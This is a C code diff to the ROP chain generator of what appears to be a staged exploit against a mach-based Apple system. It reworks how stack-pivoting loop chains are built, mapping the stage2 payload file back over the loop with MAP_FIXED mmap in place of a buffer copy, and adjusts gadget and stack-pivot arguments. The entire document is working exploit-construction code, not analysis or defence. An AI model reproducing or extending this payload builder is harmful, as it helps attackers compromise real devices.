@@ -1,6 +1,7 @@
 #include "common.h"
 #include "rop.h"
 #include "stage2.h"
+#include "stage1.h"
 #include <mach/mach.h>
 #include <aio.h>
 #include <fcntl.h>
@@ -81,6 +82,7 @@ uint64_t get_rop_var_addr(offset_struct_t * offsets, rop_var_t * ropvars, char *
 }
 void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 	rop_gadget_t * next = offsets->stage2_ropchain;	
+	rop_gadget_t * prev_gadget;
 	uint64_t buf;
 	int offset_delta = 0;
 	uint64_t chain_pos = 0;
@@ -147,14 +149,10 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 						int ropchain_len = 0;
 						int rop_var_tmp_nr = 0;
 						
-						// free the buf we allocated for the loop
-						ROP_VAR_ARG64(loop_buf_name,1);
-						CALL_FUNC(get_addr_from_name(offsets,"munmap"),0,0,0,0,0,0,0,0);
-						
 						// pivot the stack to where we want it
 						CALL_FUNC(offsets->stack_pivot,0,0,0,0,0,0,0,0);
 						chain_per_break = ropchain_len * 8;
-						chain_for_loop_end = chain_per_break;
+						chain_for_loop_end = chain_per_break*2; // we have to calls for end
 						chain_per_break += 36*8; // add the if monster below
 				}
 				int loop_size = 0;
@@ -168,30 +166,12 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 				}
 				if (lookahead_gadget == NULL) {printf("Loop start without an end!\n");exit(1);}
 
-				// inject the gadgets to alloc a buffer and copy the part of the chain which is the loop into it
 				rop_gadget_t * bck_next = next->next;
-				uint64_t chain_start = 0;
-				{
-						// setup rop chain generator
-						rop_gadget_t * prev = NULL;
-						rop_gadget_t * curr_gadget = next;
-						curr_gadget->next = NULL;
-						curr_gadget->type = NONE;
-						curr_gadget->comment = NULL;
-						int ropchain_len = (chain_pos-offset_delta)/8+1;
-						int rop_var_tmp_nr = 0;
-
-						int map_needed = loop_size;
-						if (loop_size < 0x4000) {map_needed = 0x4000;}
-						
-						CALL_FUNC_RET_SAVE_VAR(loop_buf_name,get_addr_from_name(offsets,"__mmap"),NULL,map_needed & ~0x3fff,PROT_READ | PROT_WRITE,MAP_PRIVATE | MAP_ANON,0,0,0,0);
-
-						ROP_VAR_ARG64(loop_buf_name,1);
-						chain_start = chain_pos + offsets->stage2_base + (ropchain_len*8-chain_pos-offset_delta) + 15*8; /* to get behind that memcpy call */
-						CALL_FUNC(get_addr_from_name(offsets,"memcpy"),0,chain_start,loop_size,0,0,0,0,0);
-
-						curr_gadget->next = bck_next;
-				}
+				free(next);
+				prev_gadget->next = bck_next;
+				next = bck_next;
+				uint64_t chain_start = chain_pos + offsets->stage2_base;
+				uint64_t chain_start_in_file = chain_pos;
 
 				// replace all the ROP_LOOP_BREAK gadgets with the chain
 				lookahead_gadget = next;
@@ -209,13 +189,14 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 						int rop_var_tmp_nr = 0;
 						
 						
-						// memcpy the buffer back over the loop
+						// mmap the file back over the loop
+						int mmap_size = loop_size;
+						if (mmap_size & 0x3fff) {mmap_size = (mmap_size & ~0x3fff) + 0x4000;}
 						ADD_COMMENT("restore the loop stack");
-						ROP_VAR_ARG64(loop_buf_name,2);
-						CALL_FUNC(get_addr_from_name(offsets,"memcpy"),chain_start,0,loop_size,0,0,0,0,0);
+						CALL_FUNC(get_addr_from_name(offsets,"__mmap"),(chain_start & ~0x3fff),mmap_size,PROT_READ | PROT_WRITE,MAP_FIXED | MAP_FILE,STAGE2_FD,(chain_start_in_file & ~0x3fff),0,0);
 						
 						ADD_COMMENT("stack pivot mov sp,x2");
-						CALL_FUNC(offsets->stack_pivot,0,chain_start,0,0,0,0,0,0);
+						CALL_FUNC(offsets->stack_pivot,0,0,chain_start,0,0,0,0,0);
 						curr_gadget->next = bck_next;
 						break;
 					} else if (lookahead_gadget->type == ROP_LOOP_BREAK) {
@@ -273,14 +254,8 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 						ADD_GADGET(); /* x29 (not 0) */
 						ADD_CODE_GADGET(offsets->BEAST_GADGET_LOADER); /* x30 (not 0) */
 						
-						// free the buf we allocated for the loop
-						int map_needed = loop_size;
-						if (loop_size < 0x4000) {map_needed = 0x4000;}
-						ROP_VAR_ARG64(loop_buf_name,1);
-						CALL_FUNC(get_addr_from_name(offsets,"munmap"),0,map_needed & ~0x3fff,0,0,0,0,0,0);
-						
 						// pivot the stack to where we want it
-						CALL_FUNC(offsets->stack_pivot,0,chain_start+loop_size,0,0,0,0,0,0);
+						CALL_FUNC(offsets->stack_pivot,0,0,chain_start+loop_size,0,0,0,0,0);
 						curr_gadget->next = bck_next;
 					}else {lookahead_pos += 8;}
 					lookahead_gadget = lookahead_gadget->next;
@@ -300,6 +275,7 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 				write(fd,&buf,8);
 				chain_pos += 8;
 		}
+		prev_gadget = next;
 		next = next->next;
 	}
 	offsets->stage2_size = chain_pos + 0x1000;
@@ -331,6 +307,7 @@ char * pos_description_DBG(int pos, int longjmp_buf) {
 } 
 void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
 	rop_gadget_t * next = offsets->stage2_ropchain;	
+	rop_gadget_t * prev_gadget;
 	uint64_t current_addr = offsets->stage2_base;
 	uint64_t buf;
 	int offset_delta = 0;
@@ -431,14 +408,10 @@ void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
 						int ropchain_len = 0;
 						int rop_var_tmp_nr = 0;
 						
-						// free the buf we allocated for the loop
-						ROP_VAR_ARG64(loop_buf_name,1);
-						CALL_FUNC(get_addr_from_name(offsets,"munmap"),0,0,0,0,0,0,0,0);
-						
 						// pivot the stack to where we want it
 						CALL_FUNC(offsets->stack_pivot,0,0,0,0,0,0,0,0);
 						chain_per_break = ropchain_len * 8;
-						chain_loop_end = chain_per_break; // same up until here
+						chain_loop_end = chain_per_break*2; // two calls for end
 						chain_per_break += 36*8; // add the if monster chain from below
 				}
 				int loop_size = 0;
@@ -452,31 +425,12 @@ void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
 				}
 				if (lookahead_gadget == NULL) {printf("Loop start without an end!\n");exit(1);}
 
-				// inject the gadgets to alloc a buffer and copy the part of the chain which is the loop into it
 				rop_gadget_t * bck_next = next->next;
-				uint64_t chain_start = 0;
-				{
-						// setup rop chain generator
-						rop_gadget_t * prev = NULL;
-						rop_gadget_t * curr_gadget = next;
-						curr_gadget->next = NULL;
-						curr_gadget->type = NONE;
-						curr_gadget->comment = NULL;
-						int ropchain_len = (current_addr-offsets->stage2_base-offset_delta)/8+1;
-						int rop_var_tmp_nr = 0;
-						
-						int map_needed = loop_size;
-						if (loop_size < 0x4000) {map_needed = 0x4000;}
-						ADD_COMMENT("mmaped a buffer where we will copy the loop");
-						CALL_FUNC_RET_SAVE_VAR(loop_buf_name,get_addr_from_name(offsets,"__mmap"),NULL,map_needed & ~0x3fff,PROT_READ | PROT_WRITE,MAP_PRIVATE | MAP_ANON,0,0,0,0);
-
-						ADD_COMMENT("Copy the loop");
-						ROP_VAR_ARG64(loop_buf_name,1);
-						chain_start = current_addr + (ropchain_len*8-(current_addr-offsets->stage2_base-offset_delta)) + 15*8; /* to get behind that memcpy call */
-						CALL_FUNC(get_addr_from_name(offsets,"memcpy"),0,chain_start,loop_size,0,0,0,0,0);
-
-						curr_gadget->next = bck_next;
-				}
+				free(next);
+				prev_gadget->next = bck_next;
+				next = bck_next;
+				uint64_t chain_start = current_addr;
+				uint64_t chain_start_in_file = current_addr-offsets->stage2_base;
 
 				// replace all the ROP_LOOP_BREAK gadgets with the chain
 				lookahead_gadget = next;
@@ -494,13 +448,13 @@ void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
 						int rop_var_tmp_nr = 0;
 						
 						
-						// memcpy the buffer back over the loop
 						ADD_COMMENT("restore the loop stack");
-						ROP_VAR_ARG64(loop_buf_name,2);
-						CALL_FUNC(get_addr_from_name(offsets,"memcpy"),chain_start,0,loop_size,0,0,0,0,0);
+						int mmap_size = loop_size;
+						if (mmap_size & 0x3fff) {mmap_size = (mmap_size & ~0x3fff) + 0x4000;}
+						CALL_FUNC(get_addr_from_name(offsets,"__mmap"),(chain_start & ~0x3fff),mmap_size,PROT_READ | PROT_WRITE,MAP_FIXED|MAP_FILE,STAGE2_FD,(chain_start_in_file & ~0x3fff),0,0);
 						
 						ADD_COMMENT("stack pivot mov sp,x2");
-						CALL_FUNC(offsets->stack_pivot,0,chain_start,0,0,0,0,0,0);
+						CALL_FUNC(offsets->stack_pivot,0,0,chain_start,0,0,0,0,0);
 						
 						curr_gadget->next = bck_next;
 						break;
@@ -560,16 +514,9 @@ void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
 						ADD_CODE_GADGET(offsets->BEAST_GADGET_LOADER); /* x30 (not 0) */
 
 						
-						// free the buf we allocated for the loop
-						int map_needed = loop_size;
-						if (loop_size < 0x4000) {map_needed = 0x4000;}
-						ADD_COMMENT("free the copy of our loop");
-						ROP_VAR_ARG64(loop_buf_name,1);
-						CALL_FUNC(get_addr_from_name(offsets,"munmap"),0,loop_size & ~0x3fff,0,0,0,0,0,0);
-						
 						ADD_COMMENT("stack pivot mov sp,x2");
 						// pivot the stack to where we want it
-						CALL_FUNC(offsets->stack_pivot,0,chain_start+loop_size,0,0,0,0,0,0);
+						CALL_FUNC(offsets->stack_pivot,0,0,chain_start+loop_size,0,0,0,0,0);
 						curr_gadget->next = bck_next;
 					}else{lookahead_pos += 8;}
 					lookahead_gadget = lookahead_gadget->next;
@@ -596,6 +543,7 @@ void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
 			printf("COMMENT(line: %llu): ",next->comment->line);
 			puts(next->comment->comment);
 		}
+		prev_gadget = next;
 		next = next->next;
 	}
 	printf("===\n");
@@ -654,7 +602,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 
 	ADD_LOOP_START("test_loop")
 		ROP_VAR_ARG("test_string",2);
-		CALL("write",1,0,10,0,0,0,0,0);
+		CALL("write",1,0,1024,0,0,0,0,0);
 	ADD_LOOP_END();
 
 #if 0
